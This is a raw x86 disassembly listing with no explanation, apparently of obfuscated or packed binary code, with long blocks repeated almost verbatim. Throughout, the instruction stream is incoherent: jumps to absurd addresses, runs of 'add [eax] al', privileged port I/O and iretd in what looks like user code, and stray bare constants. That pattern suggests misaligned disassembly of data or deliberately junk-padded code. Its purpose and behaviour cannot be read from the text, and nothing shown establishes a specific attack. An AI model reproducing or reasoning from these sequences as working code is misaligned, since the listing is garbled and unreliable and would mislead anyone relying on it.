adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402db5
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c33c60
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_402c67
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_402ca4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdeb246
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2af50
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16a8a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9baf1d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f6203
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_402e2c
jb 0xffffffff81b2aae2
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_402c17
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79ad5e
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcff74
add esp 0x4
jae r-xdata
jl 0xf3aff8
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b2b3
pop eax
jg r-xdata
jge 0xffffffff894f86f1
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3eb7
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff8428a76d
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158b252
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402c67
ja r-xdata
jno r-xdata
jl 0x2f28c8c8
jno r-xdata
jl 0xfffffffff6c1ea2b
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff815008d6
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b39c
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a46901
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca53a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
jae r-xdata
ja 0xffffffffa3c33c60
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79ad5e
ja r-xdata
jge 0x71fc6ba3
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1ab65
jg r-xdata
jpo 0xdeb246
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16a8a
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_402c9b
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402db5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_402c67
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9baf1d
jae r-xdata
add edx 0xff108f0f
call sub_402c17
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_402ca4
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcff74
jae r-xdata
call sub_402e2c
jb 0xffffffff81b2aae2
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2af50
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b2b3
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f6203
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3eb7
add esp 0x4
jae r-xdata
jl 0xf3aff8
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f86f1
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158b252
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a76d
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402c9b
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81cea200
pop eax
jns r-xdata
jno 0xffffffffefc16a8a
out dx eax
jae r-xdata
jne 0xffffffffe3c20e99
push ecx
push edx
push ebp
sub esp 0x4
call sub_402c67
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1b5d0
ja r-xdata
jge 0x71fc6ba3
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b39c
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ea2b
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_402ca4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca53a
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a46901
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2af50
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1ab65
pop ecx
jns r-xdata
jno 0xffffffff874f6203
pushfd
push esi
call sub_402c9b
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402db5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
jae r-xdata
ja 0xffffffffa3c33c60
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeb246
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9baf1d
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcff74
jae r-xdata
call sub_402e2c
jb 0xffffffff81b2aae2
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b2b3
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_402c17
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3eb7
add esp 0x4
jae r-xdata
jl 0xf3aff8
jae r-xdata
jmp 0xffffffffff79ad5e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f86f1
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158b252
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a76d
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402ca4
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2af50
pop ecx
jns r-xdata
jno 0xffffffff874f6203
jg r-xdata
jo 0xffffffffcbc1ab65
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
